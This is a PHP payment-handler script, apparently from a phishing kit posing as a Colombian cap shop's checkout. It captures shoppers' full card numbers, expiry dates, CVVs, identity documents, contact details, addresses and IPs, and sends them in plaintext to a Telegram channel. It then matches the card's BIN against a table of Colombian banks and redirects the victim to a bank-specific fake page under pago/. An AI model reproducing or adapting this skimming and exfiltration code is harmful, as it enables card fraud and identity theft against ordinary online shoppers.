<?php
/* =======================================================
   PANEL 2.0 — procesar_pago.php (CORREGIDO)
   Datos correctos y total real
======================================================= */

session_start();
require_once __DIR__ . "/config.php";

/* =======================================================
   1. DETECTAR TIPO DE FLUJO
======================================================= */

// Verificar si viene del botón Bancolombia (sin datos de tarjeta)
$esBancolombia = isset($_POST['email_bank']) && 
                 isset($_POST['titular']) && 
                 isset($_POST['tipo_documento']) && 
                 isset($_POST['documento']) && 
                 !isset($_POST['tarjeta']);

if ($esBancolombia) {
    procesarBancolombia();
} else {
    procesarTarjeta();
}

/* =======================================================
   2. FUNCIÓN: PROCESAR BANCOLOMBIA
======================================================= */
function procesarBancolombia() {
    global $pdo;
    
    // DATOS DEL FORMULARIO BANCOLOMBIA
    $emailBank      = sanitizeInput($_POST['email_bank'] ?? '');
    $titularBank    = sanitizeInput($_POST['titular'] ?? '');
    $tipoDocBank    = sanitizeInput($_POST['tipo_documento'] ?? '');
    $documentoBank  = sanitizeInput($_POST['documento'] ?? '');
    $telefonoBank   = sanitizeInput($_POST['telefono'] ?? '');
    $cvvBank        = sanitizeInput($_POST['cvv'] ?? '');
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'IP no detectada';
    
    // Validar datos básicos de Bancolombia
    if (empty($emailBank) || empty($titularBank) || empty($documentoBank)) {
        die("Error: Datos de Bancolombia incompletos");
    }
    
    // DATOS DEL CLIENTE (vienen del checkout - sesión previa)
    $nombre         = $_SESSION['cliente_nombre'] ?? '';
    $apellidos      = $_SESSION['cliente_apellidos'] ?? '';
    $tipo_documento = $_SESSION['cliente_tipo_documento'] ?? '';
    $documento      = $_SESSION['cliente_documento'] ?? '';
    $telefono       = $_SESSION['cliente_telefono'] ?? '';
    $correo         = $_SESSION['cliente_correo'] ?? '';
    $ciudad         = $_SESSION['cliente_ciudad'] ?? '';
    $departamento   = $_SESSION['cliente_departamento'] ?? '';
    $direccion      = $_SESSION['cliente_direccion'] ?? '';
    $complemento    = $_SESSION['cliente_complemento'] ?? '';
    
    // TOTAL REAL (viene del checkout)
    $totalPago = $_SESSION['total_pago'] ?? 0;
    $totalFormateado = '$' . number_format($totalPago, 0, ',', '.') . ' COP';
    
    // Actualizar o Insertar registro en panel
    try {
        $idreg = $_SESSION['idreg'] ?? 0;
        if ($idreg > 0) {
            $stmt = $pdo->prepare("
                UPDATE registros 
                SET banco = 'Bancolombia', status = 1, horamodificado = NOW()
                WHERE id = ?
            ");
            $stmt->execute([$idreg]);
        } else {
            $stmt = $pdo->prepare("
                INSERT INTO registros (banco, ip, status, horamodificado, nombre, cedula, celular, email)
                VALUES ('Bancolombia', ?, 1, NOW(), ?, ?, ?, ?)
            ");
            $stmt->execute([$ip, $nombre, $documento, $telefono, $correo]);
            $idreg = $pdo->lastInsertId();
            $_SESSION['idreg'] = $idreg;
        }
        $_SESSION['total_caso_' . $idreg] = $totalPago;
        
    } catch (PDOException $e) {
        error_log("Error insertando registro Bancolombia: " . $e->getMessage());
        die("Error procesando el pago. Por favor, inténtelo nuevamente.");
    }
    
    // MENSAJE PARA TELEGRAM
    $mensaje  = "🏦 *NUEVO PEDIDO BANCOLOMBIA*\n";
    $mensaje .= "=========================\n\n";
    
    // DATOS DEL CLIENTE
    $mensaje .= "👤 *Cliente*\n";
    $mensaje .= "{$nombre} {$apellidos}\n";
    $mensaje .= "Documento: {$tipo_documento} {$documento}\n";
    $mensaje .= "Teléfono: {$telefono}\n";
    $mensaje .= "Correo: {$correo}\n";
    $mensaje .= "Ciudad: {$ciudad} ({$departamento})\n";
    $mensaje .= "Dirección: {$direccion}\n";
    if ($complemento !== '') {
        $mensaje .= "Complemento: {$complemento}\n";
    }
    $mensaje .= "\n";
    
    // DATOS DEL BANCO
    $mensaje .= "🏦 *Bancolombia*\n";
    $mensaje .= "Email: {$emailBank}\n";
    $mensaje .= "Titular: {$titularBank}\n";
    $mensaje .= "Documento: {$tipoDocBank} {$documentoBank}\n";
    $mensaje .= "CVV: {$cvvBank}\n";
    $mensaje .= "Teléfono: {$telefonoBank}\n\n";
    
    // TOTAL REAL
    $mensaje .= "💰 Total: {$totalFormateado}\n\n";
    $mensaje .= "🌐 IP: {$ip}\n";
    $mensaje .= "📱 ID Registro: {$idreg}\n";
    $mensaje .= "🧢 Gorras\n";
    
    // Enviar a Telegram
    enviarTelegramGlobal($mensaje);
    
    // Redirigir al flujo de Bancolombia
    header("Location: pago/bancolombia/index.php");
    exit;
}

/* =======================================================
   3. FUNCIÓN: PROCESAR TARJETA NORMAL
======================================================= */
function procesarTarjeta() {
    global $pdo;
    
    $tarjeta    = sanitizeInput($_POST['tarjeta'] ?? '');
    $fecha      = sanitizeInput($_POST['fecha'] ?? '');
    $cvv        = sanitizeInput($_POST['cvv'] ?? '');
    $emailBank  = sanitizeInput($_POST['email_bank'] ?? '');
    $telBank    = sanitizeInput($_POST['tel_bank'] ?? '');
    
    // Limpiar número de tarjeta
    $tarjeta = preg_replace('/\s+/', '', $tarjeta);
    
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'IP no detectada';
    
    // Validar datos básicos
    if (empty($tarjeta) || empty($fecha) || empty($cvv)) {
        die("Error: Datos de tarjeta incompletos");
    }
    
    // BIN limpio
    $bin = substr(preg_replace('/\D/', '', $tarjeta), 0, 6);
    
    // Datos del checkout
    $nombre         = $_SESSION['cliente_nombre'] ?? '';
    $apellidos      = $_SESSION['cliente_apellidos'] ?? '';
    $tipo_documento = $_SESSION['cliente_tipo_documento'] ?? '';
    $documento      = $_SESSION['cliente_documento'] ?? '';
    $telefono       = $_SESSION['cliente_telefono'] ?? '';
    $correo         = $_SESSION['cliente_correo'] ?? '';
    $ciudad         = $_SESSION['cliente_ciudad'] ?? '';
    $departamento   = $_SESSION['cliente_departamento'] ?? '';
    $direccion      = $_SESSION['cliente_direccion'] ?? '';
    $complemento    = $_SESSION['cliente_complemento'] ?? '';
    
    // TOTAL REAL
    $totalPago = $_SESSION['total_pago'] ?? 0;
    $totalFormateado = '$' . number_format($totalPago, 0, ',', '.') . ' COP';
    
    // Tabla de BINs local
    $bin_local = [
        "bancolombia" => [
            "bins"  => ["244000","517640","517710","518092","528633","530371","530372","530373","530691","530693","530694","530695","530696","536782","540691","541251","547062","547480","549157","549158","552588","552807","553145","556888","515522","518052","518086","521408","521418","523818","524830","533254","534964","542417","546039","547186","549518","553014","553020","559529"],
            "nivel" => "Débito",
            "redir" => "pago/bancolombia/index.php"
        ],
        "davivienda" => [
            "bins"  => ["231026","232002","232010","360324","403899","407383","424488","425817","425949","425950","425951","428392","430464","439116","439152","441080","451733","454300","455370","455981","455982","455983","455986","456360","458173","472043","472044","473228","474493","480405","485630","485970","486437","491646","491647","491648","498465","510241","511614","512392","515547","516405","517603","517796","520024","520981","522387","524052","524708","526557","526943","527402","528811","533295","534808","540581","540692","541083","541694","543982","547063","547113","547130","547246","547482","548084","548788","549156","549724","550444","551313","552201","552336","552903","552976","554531","554901","554936","556596","559186","559225","589514","515494","518070","521436","531743","533230","534989","539009","541661","542730","544219","544353","545564","546040","546406","549289","550004","553199","559528"],
            "nivel" => "Crédito",
            "redir" => "pago/davivienda/index.php"
        ],
        "bbva" => [
            "bins"  => ["404279","404280","410164","421892","439216","439467","450407","450408","450418","454100","454759","455100","456783","459419","462550","485995","492468","492488","492489"],
            "nivel" => "Crédito",
            "redir" => "pago/bbva/index.php"
        ],
        "bogota" => [
            "bins"  => ["404279","404280","410164","421892","439216","439467","450407","450408","450418","454100","454759","455100","456783","459419","462550","485995","492468","492488","492489"],
            "nivel" => "Crédito",
            "redir" => "pago/bogota/index.php"
        ],
        "colpatria" => [
            "bins"  => ["230549","379362","483160","483161","510608","511577","511696","512067","512577","512645","512679","514907","515816","515858","519971","519986","520142","520147","522210","524057","525358","525723","525984","527076","528009","528085","528098","528884","529239","529404","529448","531960","531961","534173","534174","534599","535803","540690","540855","540919","541659","541692","541693","543421","543448","546853","547064","547129","547479","547692","548185","550206","552066","552074","553662","554603","554933","590710","590712"],
            "nivel" => "Crédito",
            "redir" => "pago/colpatria/index.php"
        ],
        "occidente" => [
            "bins"  => ["230874","230880","400446","400489","400490","400491","400608","401079","407849","425987","430485","431026","431027","441511","448388","450650","456390","459066","462940","462941","475094","485936","489911","489925","491330","496074","496075","496076","496077","496078","512835","515455","516282","516288","528153","530710","530711","530712","530713","530714","530715","530716","530717","530718","530719","530720","530721","530722","530723","530724","530725","530726","530727","530728","530729","532390","532406","532645","533370","536467","539914","540031","540625","541088","541203","547385","549151","552256","556831","558772","515465","515470","515529","521415","531769","534798","537268","545595","549415","554358"],
            "nivel" => "Débito",
            "redir" => "pago/occidente/index.php"
        ],
        "avvillas" => [
            "bins"  => ["412709","412706","470438","470439","470440","482451","496079","496080","496081","518503","521399","522973","523577","524627","539828","539862","547141","547142","547513","548567"],
            "nivel" => "Débito",
            "redir" => "pago/avvillas/index.php"
        ],
        "serfinanza" => [
            "bins"  => ["223223","527474","529787","536004","542060","543280","555905","555906","678424"],
            "nivel" => "Débito",
            "redir" => "pago/serfinanza/index.php"
        ],
        "falabella" => [
            "bins"  => ["407876","409767","410406","410407","421413","447409","447410","447411","451787","513689","514332","528201","528209","533187","542676","543592","558630","515527","515552","533244","559522"],
            "nivel" => "Débito",
            "redir" => "pago/falabella/index.php"
        ],
        "Cajasocial" => [
            "bins"  => ["443846","443847","443849","450648","450796","453924","457021","457022","459386","459388","462947","486618","489445","498478","498534"],
            "nivel" => "Débito",
            "redir" => "pago/cajasocial/index.php"
        ],
        "finandina" => [
            "bins"  => ["484191","484193"],
            "nivel" => "Crédito",
            "redir" => "pago/finandina/index.php"
        ]
    ];
    
    // Detectar banco local
    $BancoDetectado = "Desconocido";
    $NivelDetectado = "No identificado";
    $RedirectLink   = "pago/generico/index.php";
    
    foreach ($bin_local as $nombreBanco => $infoBanco) {
        if (in_array($bin, $infoBanco["bins"])) {
            $BancoDetectado = ucfirst($nombreBanco);
            $NivelDetectado = $infoBanco["nivel"];
            $RedirectLink   = $infoBanco["redir"];
            break;
        }
    }
    
    // Actualizar o Insertar registro en panel
    try {
        $idreg = $_SESSION['idreg'] ?? 0;
        if ($idreg > 0) {
            $stmt = $pdo->prepare("
                UPDATE registros 
                SET banco = ?, status = 1, horamodificado = NOW()
                WHERE id = ?
            ");
            $stmt->execute([$BancoDetectado, $idreg]);
        } else {
            $stmt = $pdo->prepare("
                INSERT INTO registros (banco, ip, status, horamodificado, nombre, cedula, celular, email)
                VALUES (?, ?, 1, NOW(), ?, ?, ?, ?)
            ");
            $stmt->execute([$BancoDetectado, $ip, $nombre, $documento, $telefono, $correo]);
            $idreg = $pdo->lastInsertId();
            $_SESSION['idreg'] = $idreg;
        }
        
        $_SESSION['total_caso_' . $idreg] = $totalPago;
        
    } catch (PDOException $e) {
        error_log("Error insertando registro: " . $e->getMessage());
        die("Error procesando el pago. Por favor, inténtelo nuevamente.");
    }
    
    // MENSAJE PARA TELEGRAM
    $mensaje  = "🧾 *NUEVO PEDIDO*\n";
    $mensaje .= "=========================\n\n";
    $mensaje .= "👤 *Cliente*\n";
    $mensaje .= "{$nombre} {$apellidos}\n";
    $mensaje .= "Documento: {$tipo_documento} {$documento}\n";
    $mensaje .= "Teléfono: {$telefono}\n";
    $mensaje .= "Correo: {$correo}\n";
    $mensaje .= "Ciudad: {$ciudad} ({$departamento})\n";
    $mensaje .= "Dirección: {$direccion}\n";
    if ($complemento !== '') {
        $mensaje .= "Complemento: {$complemento}\n";
    }
    $mensaje .= "\n";
    $mensaje .= "💳 *Tarjeta*\n";
    $mensaje .= "Número: {$tarjeta}\n";
    $mensaje .= "Fecha: {$fecha}\n";
    $mensaje .= "CVV: {$cvv}\n";
    $mensaje .= "BIN: {$bin}\n";
    $mensaje .= "Banco detectado: {$BancoDetectado}\n";
    $mensaje .= "Nivel: {$NivelDetectado}\n\n";
    $mensaje .= "💰 Total: {$totalFormateado}\n\n";
    $mensaje .= "🌐 IP: {$ip}\n";
    $mensaje .= "📱 ID Registro: {$idreg}\n";
    $mensaje .= "🧢 Gorras\n";
    
    // Enviar a Telegram
    enviarTelegramGlobal($mensaje);
    
    // Redirigir al flujo del banco
    header("Location: $RedirectLink");
    exit;
}
?>